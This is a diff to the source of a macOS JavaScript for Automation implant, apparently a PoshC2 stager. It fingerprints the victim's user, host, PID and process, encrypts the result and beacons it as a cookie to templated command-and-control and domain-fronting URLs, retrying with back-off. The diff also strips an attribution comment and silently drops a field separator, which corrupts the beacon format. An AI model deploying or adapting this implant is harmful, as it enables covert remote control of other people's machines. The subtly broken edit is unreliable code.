@@ -8,10 +8,10 @@ currentApp.includeStandardAdditions = true;
 
 // Global Vars:
 //#REPLACEINSECURE#
-var df = [#REPLACEDOMAINFRONT#];
+var df = [#REPLACEDOMAINFRONT#]
 var h = "";
 var sc = "";
-var urls = [#REPLACEIMPTYPE#];
+var urls = [#REPLACEIMPTYPE#]
 var curl = "#REPLACECONNECTURL#";
 var s = urls[0]
 
@@ -19,7 +19,7 @@ var s = urls[0]
 class agent{
 	constructor(){
 		this.procInfo = $.NSProcessInfo.processInfo;
-        	this.procName = $.NSProcessInfo.processName;
+        this.procName = $.NSProcessInfo.processName;
 		this.hostInfo = $.NSHost.currentHost;
 		this.cu = ObjC.deepUnwrap(this.procInfo.userName);
 		this.pid = this.procInfo.processIdentifier;
@@ -28,7 +28,7 @@ class agent{
 }
 var posh_implant = new agent();
 
-// partly based on Apfel https://github.com/its-a-feature/Mythic
+
 function enc(data){
     // takes in the string we're about to send, encrypts it, and returns a new string
     let err = Ref();
@@ -133,7 +133,7 @@ function primern(url) {
     } else {
         el = "";
     }
-    let o = posh_implant.cu + el + ';' + posh_implant.host + ';' + posh_implant.pid + ';' + posh_implant.procName +';#REPLACEURLID#';
+    let o = posh_implant.cu + el + ';' + posh_implant.host + ';' + posh_implant.pid + posh_implant.procName +';#REPLACEURLID#';
     // Encrypt o and set as cookie
     let cookie = enc(o);
     primern = get_webclient(cookie);
@@ -200,9 +200,9 @@ var parameters = $({"type": $.kSecAttrKeyTypeAES});
 var raw_key = $.NSData.alloc.initWithBase64Encoding(aes_psk);
 var cryptokey = $.SecKeyCreateFromData(parameters, raw_key, Ref());
 
-let limit = #REPLACESTAGERRETRIESLIMIT#;
+let limit = #REPLACESTAGERRETRIESLIMIT#
 while (true) {
-    let wait = #REPLACESTAGERRETRIESWAIT#; // used to try 30 times, starting with a 5 second wait, doubling each time until dying.
+    let wait = #REPLACESTAGERRETRIESWAIT# // used to try 30 times, starting with a 5 second wait, doubling each time until dying.
     if (limit > 0) {
         limit = limit - 1;
         primers();
